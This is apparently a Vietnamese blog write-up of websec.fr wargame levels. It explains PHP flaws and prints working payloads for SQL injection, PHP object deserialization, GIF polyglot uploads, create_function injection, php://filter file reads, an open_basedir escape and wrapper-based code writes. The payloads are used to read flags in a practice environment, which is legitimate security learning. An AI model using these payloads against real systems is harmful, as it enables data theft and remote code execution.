---
title: websec.fr
description: websec.fr
summary: Write up of some Web challenge in websec.fr
cover: ./cover.jpg
published: '2022-02-02T22:00:00.000+08:00'
updated: '2022-02-02T12:00:00.000+08:00'
tags:
  - [ wargame ]
---

# level01

![image](https://user-images.githubusercontent.com/75429369/179963339-bc0671f2-f043-4b12-a74a-3fd5ca44348c.png)

Sqlite3 có query hoàn toàn có thể thực hiện sqli, fuzz số cột thì biết được có 2 cột

```
1 and 1=0 union select sql,sql from sqlite_master -- '
```

![image](https://user-images.githubusercontent.com/75429369/179965358-c36348da-ac37-4f0d-891b-e9f4bb468304.png)

Có password kìa select nó ra với id 1 nào

```
1 and 1=0 union select password,password from users where id = 1 --'
```

![image](https://user-images.githubusercontent.com/75429369/179965685-6e109132-1c56-4b00-9b44-291905d404c7.png)

# level04

Bài cho 2 source code, source thứ nhất có chỗ đáng lưu ý sau

![image](https://user-images.githubusercontent.com/75429369/179966473-82c383f6-4bd9-4dcd-89bf-26e1fca980f9.png)

Kiểm tra có cookie và sẽ unserialize cái cookie đấy. Source thứ hai:

![image](https://user-images.githubusercontent.com/75429369/179966371-845ea550-b87f-4913-8972-ad29b77a98eb.png)

Có function `SQL_query` trỏ vào `$query` có liên kết với source thứ nhất. Với id = 1 thì ta được flag nên giờ chỉ cần select được tới nó là xong, đơn giản chỉ cần modify cái cookie thành serialize của class SQL mà trong đó sẽ có query sqli inject thêm từ query có sẵn trong source (nhớ base64 nữa).

```php
<?php 
class SQL {
  public $query = "SELECT username from users where id=1 UNION SELECT password from users where id=1";
}

$a = new SQL();
echo base64_encode(serialize($a));
?>
```

![image](https://user-images.githubusercontent.com/75429369/179969680-394dcc22-5173-4012-a1b5-cb43b030e870.png)

![image](https://user-images.githubusercontent.com/75429369/179969719-d132c13e-9a11-4ae4-9857-f609ef502872.png)

# level17

Bài này bắt ta nhập biến `flag` sau đó so sánh bằng hàm `strcasecmp` với $flag có sẵn, nếu ra sai thì sẽ cho flag. Có thể tham khảo hàm `strcasecmp` tại [đây](https://www.php.net/manual/en/function.strcasecmp.php)

![image](https://user-images.githubusercontent.com/75429369/179970219-15775230-4cbe-489e-a834-6f7d667d9ee1.png)

Trick để bypass bài này là thay vì nhập $flag là một string thì ta sẽ nhập dưới dạng một array, lúc này kết quả so sánh sẽ trả về `NULL` (tự debug nha)

![image](https://user-images.githubusercontent.com/75429369/179972273-94a3252b-73b0-4ebb-a7d7-a8e305fa332f.png)

# level25

Bài này cho nhập vào một trang muốn include. Đọc source lưu ý chỗ như sau

![image](https://user-images.githubusercontent.com/75429369/179972889-c83b046a-89ab-4f7d-b597-87d1db3aea56.png)

![image](https://user-images.githubusercontent.com/75429369/179972913-5c18ef80-d9cb-4ca4-86e5-2f5a71d5666a.png)

Ban đầu thấy biến `page` tưởng chừng path traversal nhưng ở bước include nó đã thêm .txt vào đuôi rồi nên ta không thể đi theo hướng này.

Phân tích chỗ parse_url(), trước hết ta phải hiểu nó làm gì đã

![image](https://user-images.githubusercontent.com/75429369/179973464-1814f784-657f-4323-89e2-3c1e6647114e.png)

Vậy thì sau khi parse nó sẽ tạo ra mảng như trên, như trong source code sẽ lấy phần query ra và kiểm tra nếu chứa chữ `flag` thì sẽ báo lỗi.

Ở đây sẽ có nhiều hướng bypass, cách dễ dàng nhất là sử dụng 3 dấu slash, tham khảo thêm ở [đây](https://www.php.net/manual/en/function.parse-url.php) và [đây](https://blog.birost.com/a?ID=01000-ed462190-b4c0-40c0-84bb-0c96dc4be3fb)

![image](https://user-images.githubusercontent.com/75429369/179976647-a03f2616-9579-482a-8a44-7de0114a8a16.png)

Hoặc ta có thể nhập định dạng sai, ở đây mình thêm `:3` vào phía sau (tự debug nhé)

![image](https://user-images.githubusercontent.com/75429369/179977161-ad890710-8f82-463a-a880-d90b740826c8.png)

# level02

Bài này giống y hệt level 01, chỉ khác là sử dụng `preg_replace` để filter các kí tự cho payload sqli

![image](https://user-images.githubusercontent.com/75429369/179978149-ee531064-0cb0-43e9-a6d8-e417cd8e04d4.png)

Bypass chỗ này bằng cách sau

![image](https://user-images.githubusercontent.com/75429369/179978630-983e36d5-e2b7-4da4-876a-22f5fbdc7b8a.png)

Payload thì làm i hệt như level 1

```
1 and 1=0 uniunionon seleselectct password,password frofromm users where id=1 -- '
```

![image](https://user-images.githubusercontent.com/75429369/179978918-23302c26-493c-405a-8256-9d4e5e04902b.png)

# level08

Bài này cho ta upload một file gif, đoạn code kiểm tra file gif như sau

![image](https://user-images.githubusercontent.com/75429369/180018398-20f7a068-91f5-4732-90cf-96a26cf5ac90.png)

Ta thấy code có sử dụng `exif_imagetype`, sau khi tìm hiểu hàm này trên [đây](https://www.php.net/manual/en/function.exif-imagetype.php) thì ta có thể biết rằng hàm chỉ kiểm tra file có phải gif hay không thôi, còn phần body sẽ bị bỏ qua, ta sẽ inject một đoạn code php vào phần body này, và sử dụng magic byte để khi đi qua hàm xử lí thì nó sẽ hiểu file này là gif, tham khảo magic byte [này](https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198). Payload file như sau

```
GIF87a
<?php echo join(" ",scandir('.')); ?>
```

_Note: ban đầu mình có thử function để chạy code execution luôn mà không được, hình như các function đã bị chặn gần hết, test với payload trên thì được_

![image](https://user-images.githubusercontent.com/75429369/180021542-cc7d87cf-abcb-4459-9cb5-b662697c7da7.png)

```
GIF87a
<?php echo readfile('flag.txt'); ?>
```

![image](https://user-images.githubusercontent.com/75429369/180022117-f4923ddf-38b8-4a1e-9f80-03ac40721061.png)

# level15

Bài này mới vô cho ta declare hàm nào đó với `create_function()`, source lưu ý

![image](https://user-images.githubusercontent.com/75429369/180024889-b10b1bd5-98a2-4bb1-83a7-089e1f7cac45.png)

Ban đầu, mình thử nhập như gợi ý là `echo 1337;` thôi nhưng mà mình quên `;` thì web hiện như sau

![image](https://user-images.githubusercontent.com/75429369/180025271-0f0823d2-faf1-4e0e-85bd-e8276ff4dc49.png)

À há, có nghĩa là ở trước chỗ input này thì lệnh chưa được đóng dấu `;` nên dấu `}` ngay sau đó đã lỗi, vậy thì format theo mình nghĩ sẽ như sau

```
<chỗ mình input> } (đoạn code gì đấy phía sau)
```

Vậy thì chỉ cần nhập input là `;}` để thoát khỏi dấu `}` sau đó nhập đoạn code mình muốn và comment lại đoạn phía sau là được

```
;} echo 1; //
```

![image](https://user-images.githubusercontent.com/75429369/180026065-3a61a8e3-8404-4eb8-ae18-7f4af4db4277.png)

Oke rồi đọc flag thôi

```
;} echo $flag; //
```

![image](https://user-images.githubusercontent.com/75429369/180026326-1762cca4-fb67-4cab-a4d3-c6f20b64a835.png)

Mình có đi tìm thử cách làm khác thì thấy được trang [này](https://www.exploit-db.com/exploits/32417), nghĩa là thằng `create_function` này đã lỗi sẵn :)), php 8. đã bỏ nó.

# level20

Thêm một bài serialize rồi gán vào cookie khá giống bài trên nhưng lần này có filter thêm một số kí tự và đặc biệt là filter `O:`. Mục đích của việc này là để chống khi serialize ra thì sẽ có định dạng O: ở đầu chỉ thị chữ Object. Để bypass cái này thì thay vì `O`, ta có thể dùng `C`, tham khảo ở [đây](https://www.phpinternalsbook.com/php5/classes_objects/serialization.html)

![image](https://user-images.githubusercontent.com/75429369/180036370-566fcf67-a97c-4bd4-b3aa-bb02c9d17d39.png)

```php
<?php
class Flag {

}

$a = new Flag();

echo (serialize($a));
```

![image](https://user-images.githubusercontent.com/75429369/180038108-11e50f18-7b83-4f4c-8e1f-be06f6e90770.png)

Sửa lại thành `C:4:"Flag":0:{}` rồi đem đi base64 encode rồi request với cookie với giá trị đó thôi

![image](https://user-images.githubusercontent.com/75429369/180038299-f8a54e8f-d3ed-4f05-a2c3-caa83d27428e.png)

_làm xong bật call me maybe nghe là đúng bài luôn á_

# level05

Bài này cho ta nhập một chuỗi nào đó sau đó `echo` ra, source:

![image](https://user-images.githubusercontent.com/75429369/180108461-f7a61dee-b3b6-4a3e-9eb6-c0dcf7783239.png)

Lệnh echo thực hiện bình thường nên ta có thể echo thử biến được khai báo trong source code để test, thử echo $blacklist

![image](https://user-images.githubusercontent.com/75429369/180108967-8f498e66-7034-43ef-ae38-348e627c444c.png)

Vậy thì từ lệnh echo này ta sẽ cố gắng làm sao để đọc được `flag.php`. Ta có thể sử dụng trick sau

![image](https://user-images.githubusercontent.com/75429369/180109136-054ec694-749c-4f25-93ce-a4330a805594.png)

php treat code trong dấu đô la bằng cách chạy hàm của đoạn code bên trong, ở đây thì đã bị filter dấu ngoặc và `'` rồi nên không dùng function chạy code execution được. Tới đây thì ngẫm lại ta đã biết tên file flag là gì rồi nên có một cách là ta sẽ include thẳng file flag đó ra luôn là được 

```
?q=${include$_GET[0]}&0=flag.php
```

![image](https://user-images.githubusercontent.com/75429369/180110169-926c085d-d728-43a4-a486-f32dfdc3b97e.png)

402 sao, thế đọc hẳn source code luôn

```
?q=${include$_GET[0]}&0=php://filter/convert.base64-encode/resource=flag.php
```

![image](https://user-images.githubusercontent.com/75429369/180110502-73454281-15f9-4ac9-90d0-aa4203d26dd4.png)

![image](https://user-images.githubusercontent.com/75429369/180110520-d16e290f-ab39-4e4b-9248-a9702adb2d1c.png)

# level22

Bài cho ta một service giống `3v4l.org` nhưng có filter waf rất nhiều lên input nhập vào

![image](https://user-images.githubusercontent.com/75429369/180118718-e5d59519-db65-41ad-a26d-a48594e53b61.png)

$blacklist là một mảng chứa những hàm đã bị filter, để ý thêm thì ta thấy phía trên có `get_defined_funtions()` là hàm sẽ get tất cả những hàm có sẵn rồi blacklist sẽ merge thêm những array chứa những hàm bị filter lại. Thay vì ngồi tìm cách bypass thì ta ngẫm lại một chút, $blacklist chứa gần như tất cả hàm như thế thì tại sao ta không lấy trực tiếp từ nó ra mà sử dụng luôn. Ý tưởng sẽ là như sau

![image](https://user-images.githubusercontent.com/75429369/180113861-28e4f278-9136-41f2-ba80-0b76caad2579.png)

Từ ý tưởng này thì ta bắt tay vào làm thôi, đầu tiên là ta cần phải biết được vị trí của những hàm ta muốn sử dụng từ mảng $blacklist (như hình mình debug trên thì do mình gán sẵn system vào phần tử đầu tiên rồi nên lấy ra chỉ cần index 0 thôi). Ta có thể ngồi mò như này:

![image](https://user-images.githubusercontent.com/75429369/180118980-a9be412d-1d65-4b90-bfda-bd8d80b5f0b4.png)

Hoặc dùng intruder của burp suite rồi filter những hàm mình cần thôi, vì đọc code thấy file flag được include rồi sau đó sẽ cho biến `$a` xử lí gì với class A gì đó không rõ, nhưng var_dump nó thì được flag

![image](https://user-images.githubusercontent.com/75429369/180120246-db0c6536-f62b-4f5a-a349-ef425520b10c.png)

![image](https://user-images.githubusercontent.com/75429369/180119897-9845d849-6605-4fa3-87b7-e6fd0a2b3fcd.png)

![image](https://user-images.githubusercontent.com/75429369/180119919-dc9361ee-1539-4984-9536-c6479f55a8ad.png)

![image](https://user-images.githubusercontent.com/75429369/180119951-0edfc8bd-0bf4-46b7-8870-161574d2b578.png)

# level31

Bài cho ta có thể nhập một lệnh php nào đó và bảo chúng ta làm sao để đọc `./flag.php`, đoạn code cần chú ý như sau

```php
 <?php
ini_set('open_basedir', '/sandbox');
chdir('/sandbox');

ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

if (isset ($_GET['c'])) {
    die (eval ($_GET['c']));
}
?>
```

Ở đây thì basedir là `/sandbox`, đọc thử `flag.php` thì không có trong thư mục hiện tại là `/sandbox`

```php
readfile('./flag.php');
```

![image](https://user-images.githubusercontent.com/75429369/183091836-ca050ab7-2893-48a0-a9bb-53421c5cebcf.png)

Như vậy thì file này chỉ có thể là ở directory khác, mà cái `open_basedir` thì không cho phép ta truy cập tới thư mục khác được.

![image](https://user-images.githubusercontent.com/75429369/183092162-5c5bc1cc-9047-430d-a64b-0c3deb9c0757.png)

Đoạn `eval` bên dưới thì chả có gì để nói rồi, nên mục tiêu của ta chỉ là bypass được chỗ `open_basedir` là xong, mình có tham khảo được bài [này](https://twitter.com/eboda_/status/1113839230608797696) 

![image](https://user-images.githubusercontent.com/75429369/183096618-32fd74f6-f1f9-4c3e-99d1-f91f35844b4d.png)

Sử dụng nó thử nào, giờ ta phải tìm được sub-directory của `/sandbox` đã, cái này thì dễ rồi

```php
print_r(scandir('.'));
```

![image](https://user-images.githubusercontent.com/75429369/183096929-6abdc4e5-c9b3-419a-bbc7-a802b3ef8d22.png)

Là `tmp`, hoàn thiện payload thôi:

```php
chdir('tmp'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); chdir('..'); ini_set('open_basedir','/'); readfile('/flag.php');
```

![image](https://user-images.githubusercontent.com/75429369/183097086-9a69eb04-25af-4e65-b562-aa73a7853dbf.png)

# level24

Đề bài cho ta tạo file bằng cách nhập tên file rồi sau đó cho điều chỉnh content của file, cuối cùng là lưu vào `/upload/<cái gì đấy>/<tên file>`

```php
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

session_start();

include 'clean_up.php';

/* periodic cleanup */
foreach (glob("./uploads/*") as $file) {
    if (is_file($file)) {
        unlink($file);
    } else {
        if (time() - filemtime($file) >= 60 * 60 * 24 * 7) {
            Delete($file);
        }
    }
}

$upload_dir = sprintf("./uploads/%s/", session_id());
@mkdir($upload_dir, 0755, true);

/* sandboxing ! */
chdir($upload_dir);
ini_set('open_basedir', '.');

$p = "list";
$data = "";
$filename = "";

if (isset($_GET['p']) && isset($_GET['filename']) ) {
    $filename = $_GET['filename'];
    if ($_GET['p'] === "edit") {
        $p = "edit";
        if (isset($_POST['data'])) {
            $data = $_POST['data'];
            if (strpos($data, '<?')  === false && stripos($data, 'script')  === false) {  # no interpretable code please.
                file_put_contents($_GET['filename'], $data);
                die ('<meta http-equiv="refresh" content="0; url=.">');
            }
        } elseif (file_exists($_GET['filename'])){
            $data = file_get_contents($_GET['filename']);
        }
    }
}
?>
```

Phần đặt tên file tại param `filename` thì không có vấn đề gì nhưng chỗ `data` thì có check kiểm tra nếu chứa các tag như `<?` và `script`, nếu không có thì sẽ `file_get_contents` đến file vừa edit. Vậy ý tưởng của bài này thì quá rõ ràng, ta làm sao để inject được code php vào trong param `data` mà không cần dùng đến `<?` và `script`, sau đó truy cập đến file đấy là có thể chạy được code mà ta mong muốn.

Để bypass chỗ này, ta có thể làm các bước sau:
- Đặt tên file tại param `filename` là một php wrapper filter -> nếu ta truy cập vào filename dưới dạng php wrapper filter là base64 decode, thì nội dung bên trong sẽ bị decode theo base64 (tìm hiểu thêm về php wrapper tại [đây](https://www.php.net/manual/en/wrappers.php.php) )
- Đặt data tại param `data` là dạng code php chứa `<?` mà ta mong muốn, nhưng ta phải encode base64 cho nó để khi edit file khi `filename` đang là một php wrapper decode base64, sau đó `file_get_contents` tới thì data sẽ được base64 decode trở lại và ta đã thành công trong việc lưu arbitrary php code mà không cần dùng đến `<?`.
- Bước cuối cùng quá đơn giản, truy cập tới nó là có thể đọc flag.

Áp dụng vô bài nào, đầu tiên đặt tên file là

```
php://filter/convert.base64-decode/resource=adu.php
```

edit data thành:

```
// base64 encode từ <?php readfile('../../flag.php');?>
PD9waHAgcmVhZGZpbGUoJy4uLy4uL2ZsYWcucGhwJyk7Pz4=
```

![image](https://user-images.githubusercontent.com/75429369/183102606-802f55d4-cb69-4cdf-8583-06c91412b262.png)

Truy cập tới file và 

![image](https://user-images.githubusercontent.com/75429369/183102679-2efc75d7-558d-41e7-b190-316e0e5638c9.png)

# level09

Bài này lại tiếp tục cho ta lưu một đoạn code và đố ta làm sao đọc được `flag.txt`

```php
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);
if( isset ($_GET['submit']) && isset ($_GET['c'])) {
    $randVal = sha1 (time ());

    setcookie ('session_id', $randVal, time () + 2, '', '', true, true);

    try {
        $fh = fopen('/tmp/' . $randVal, 'w');

        fwrite (
            $fh,
                   str_replace (
                ['<?', '?>', '"', "'", '$', '&', '|', '{', '}', ';', '#', ':', '#', ']', '[', ',', '%', '(', ')'],
                '',
                $_GET['c']
            )
        );
        fclose($fh);
    } catch (Exception $e) {
        var_dump ($e->getMessage ());
    }
}

if (isset ($_GET['cache_file'])) {
    if (file_exists ($_GET['cache_file'])) {
        echo eval (stripcslashes (file_get_contents ($_GET['cache_file'])));
    }
}
?>
```

Phân tích code chỗ này một xíu, đầu tiên nó sẽ set cookie `session_id` từ $randVal và hàm `time()`, tại param `c` mà ta input, nó sẽ kiểm tra và thay thế tất cả những kí tự như trong code, sau đấy sẽ ghi vào file được lưu tại `/tmp/<output từ hàm $randVal`. Rồi cuối cùng kiểm tra nếu có param `cache_file` thì sẽ `stripcslashes` cái  `file_get_contents` file từ param này.

Sau khi tìm hiểu về [stripcslashes](https://www.php.net/manual/en/function.stripcslashes.php) thì ta cũng đã biết được hướng làm bài này, cơ bản là thằng stripcslashes kia nó sẽ unescaped string của ta, ngoài ra nếu ta thêm nó dưới dạng `\x` và 2 kí tự tiếp theo, nó sẽ biểu diễn dạng hex:

![image](https://user-images.githubusercontent.com/75429369/183106409-911d01ff-8f08-47f2-aae9-1d116b90eb89.png)

Vậy thì mục tiêu bây giờ chỉ là ghi vào file với data là đoạn arbitrary code dưới dạng hex, sau đó dễ dàng truy cập tới nó bằng cách set thêm param `cache_file` và tên file lấy từ cookie `session_id` nữa là có thể đọc file flag.

```
\x72\x65\x61\x64\x66\x69\x6c\x65\x28\x27\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x3b

readfile('flag.txt');
```

![image](https://user-images.githubusercontent.com/75429369/183109782-fb47c245-7307-4694-8ac4-dda9e486a607.png)

Gửi request thành công, lấy cookie gán cho `cache_file` nữa là oke (thêm cái /tmp/ nữa)

![image](https://user-images.githubusercontent.com/75429369/183109887-2297ab1c-9bba-4a5d-a70b-f907bb40d8c5.png)
